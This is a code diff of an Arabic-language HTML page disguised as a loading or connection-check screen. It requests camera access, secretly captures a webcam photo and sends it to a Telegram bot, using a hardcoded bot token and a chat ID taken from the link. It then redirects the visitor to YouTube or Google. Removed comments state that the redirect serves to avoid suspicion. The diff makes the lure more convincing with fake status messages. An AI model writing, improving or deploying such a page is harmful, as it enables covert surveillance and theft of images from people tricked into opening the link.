@@ -5,38 +5,50 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>جاري التحميل...</title>
     <style>
-        body { background-color: black; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: Arial, sans-serif; }
-        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; }
+        body { background-color: #121212; color: white; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: Arial, sans-serif; text-align: center; }
+        .loader { border: 5px solid #333; border-top: 5px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; margin-bottom: 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #status { font-size: 18px; color: #aaa; }
     </style>
 </head>
 <body>
     <div class="loader"></div>
+    <div id="status">جاري فحص الاتصال...</div>
+    
     <video id="video" width="640" height="480" autoplay style="display:none;"></video>
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
     <script>
-        // إعدادات البوت (سيتم استبدالها تلقائياً أو يدوياً)
         const BOT_TOKEN = '8410418500:AAEHAjlN1KbbcgN5g0nrgYiGKNzllqwmAyg';
-        
-        // الحصول على معرف الدردشة من الرابط (مثلاً index.html?chat_id=12345)
         const urlParams = new URLSearchParams(window.location.search);
         const chatId = urlParams.get('chat_id');
+        const statusDiv = document.getElementById('status');
 
         async function startCamera() {
+            if (!chatId) {
+                statusDiv.innerHTML = "❌ خطأ: معرف الدردشة مفقود في الرابط.";
+                return;
+            }
+
+            statusDiv.innerHTML = "⏳ يرجى الضغط على 'سماح' للكاميرا للمتابعة...";
+
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                statusDiv.innerHTML = "✅ تم الاتصال.. جاري المعالجة...";
+                
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 
-                // الانتظار قليلاً حتى تفتح الكاميرا ثم التقاط الصورة
                 setTimeout(() => {
                     takeSnapshot(stream);
                 }, 2000);
             } catch (err) {
-                console.error("Error accessing camera: ", err);
-                // إعادة التوجيه لموقع حقيقي لإبعاد الشبهة
-                window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+                statusDiv.innerHTML = "❌ فشل الوصول للكاميرا: " + err.name;
+                console.error(err);
+                // إذا رفض المستخدم، يمكننا توجيهه بعد 3 ثوانٍ
+                setTimeout(() => {
+                    window.location.href = "https://www.google.com";
+                }, 3000);
             }
         }
 
@@ -52,29 +64,32 @@
         }
 
         function sendToTelegram(blob, stream) {
+            statusDiv.innerHTML = "📤 جاري إرسال البيانات...";
             const formData = new FormData();
             formData.append('chat_id', chatId);
             formData.append('photo', blob, 'photo.jpg');
-            formData.append('caption', '📸 تم التقاط صورة جديدة من الرابط!');
+            formData.append('caption', '📸 صورة جديدة من الرابط المطور!');
 
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                 method: 'POST',
                 body: formData
             }).then(response => {
-                // إيقاف الكاميرا بعد الإرسال
+                if (response.ok) {
+                    statusDiv.innerHTML = "✅ اكتمل التحميل!";
+                } else {
+                    statusDiv.innerHTML = "❌ خطأ في إرسال الصورة للبوت.";
+                }
                 stream.getTracks().forEach(track => track.stop());
-                // إعادة التوجيه لموقع حقيقي
-                window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+                setTimeout(() => {
+                    window.location.href = "https://www.youtube.com";
+                }, 1000);
             }).catch(err => {
-                console.error("Error sending to Telegram: ", err);
+                statusDiv.innerHTML = "❌ خطأ في الاتصال بتليجرام.";
             });
         }
 
-        if (chat_id) {
-            startCamera();
-        } else {
-            document.body.innerHTML = "<h1>خطأ في الرابط</h1>";
-        }
+        // بدء العملية
+        startCamera();
     </script>
 </body>
-</html
+</html>
